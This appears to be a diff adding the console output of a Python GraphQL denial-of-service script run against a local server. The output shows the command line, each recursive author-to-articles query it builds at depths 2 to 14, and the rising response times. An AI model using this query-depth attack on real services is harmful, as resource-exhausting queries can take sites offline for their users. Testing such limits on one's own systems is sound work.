@@ -1,0 +1,43 @@
+> python .\DoS_RecursionAutomatic.py -u http://localhost:1337/graphql/ -c author articles --root article --root-args 'documentId: \"tpjgd7wz9ceascbcw4d8kpuy\"'
+
+
+Testing recursion: author -> articles
+Wrapped in root field: article(documentId: "tpjgd7wz9ceascbcw4d8kpuy")
+Depths 2-20 (step 2) with timeout=10.0s and threshold=5.0s
+
+
+------------------------------------------------------------
+
+
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { __typename } } } }
+[OK]   Depth 2 completed in 2.11s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { __typename } } } } } }
+[OK]   Depth 4 completed in 2.12s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { author { articles { __typename } } } } } } } }
+[OK]   Depth 6 completed in 2.17s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { author { articles { author { articles { __typename } } } } } } } } } }
+[OK]   Depth 8 completed in 2.18s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { author { articles { author { articles { author { articles { __typename } } } } } } } } } } } }
+[OK]   Depth 10 completed in 2.48s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { author { articles { author { articles { author { articles { author { articles { __typename } } } } } } } } } } } } } }
+[OK]   Depth 12 completed in 3.36s (HTTP 200)
+
+The following query was build:query recursiveTest { article(documentId: "tpjgd7wz9ceascbcw4d8kpuy") { author { articles { author { articles { author { articles { author { articles { author { articles { author { articles { author { articles { __typename } } } } } } } } } } } } } } } }
+[OK]   Depth 14 completed in 6.69s (HTTP 200)
+
+Stopping at depth 14 (elapsed 6.69s)
+
+Summary:
+Depth   2: OK in 2.11s (HTTP 200)
+Depth   4: OK in 2.12s (HTTP 200)
+Depth   6: OK in 2.17s (HTTP 200)
+Depth   8: OK in 2.18s (HTTP 200)
+Depth  10: OK in 2.48s (HTTP 200)
+Depth  12: OK in 3.36s (HTTP 200)
+Depth  14: OK in 6.69s (HTTP 200)
